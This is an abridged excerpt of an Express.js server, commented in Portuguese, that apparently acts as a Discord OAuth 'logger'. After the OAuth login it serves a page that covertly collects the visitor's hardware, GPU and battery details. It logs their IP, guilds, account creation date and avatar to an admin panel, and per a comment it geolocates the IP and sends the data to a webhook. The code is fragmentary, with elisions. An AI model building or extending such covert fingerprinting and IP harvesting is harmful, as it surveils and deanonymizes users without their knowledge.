...
// Memória volátil (reseta quando a Vercel desliga a função)
let loggedUsers = []; 
...
// Rotas de listagem
app.get('/api/users-list', (req, res) => res.json(loggedUsers));

app.delete('/api/users-list', (req, res) => {
    const { userId } = req.body;
    if (userId === 'ALL') {
        loggedUsers = [];
        return res.json({ success: true, message: "Todos os registros apagados." });
    }
...
app.get('/adm', (req, res) => res.sendFile(path.join(process.cwd(), 'adm.html')));
...
app.post('/login-adm', async (req, res) => {
    ...
    if (account && account.pass === pass) {
        ...
        res.json({ success: true, token, role: account.role, user, avatar: account.avatar });
    } else {
...
app.get('/callback', async (req, res) => {
    ...
    if (!code) return res.status(400).send('Erro no código');

    try {
        const tokenRes = await axios.post(`${discordApiUrl}/oauth2/token`, new URLSearchParams({
        ...
        // Renderiza a página que coleta Hardware/GPU via Front-end
        res.send(`
        <html>
            <body style="background:#000; color:#ff5fb7; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
                ...
                <script>
                    (async () => {
                        ...
                        let batInfo = "N/A";
                        try { const battery = await navigator.getBattery(); batInfo = Math.round(battery.level * 100) + "% " + (battery.charging ? "⚡" : "🔋"); } catch(e) {}
                        ...
                        // Faz o GeoIP no lado do servidor ou envia para o log final
...
app.post('/final-log', async (req, res) => {
    const { user, ip, extra, creation, guilds, avatar } = req.body;
    
    // Busca informações de Geolocalização antes de enviar o Webhook
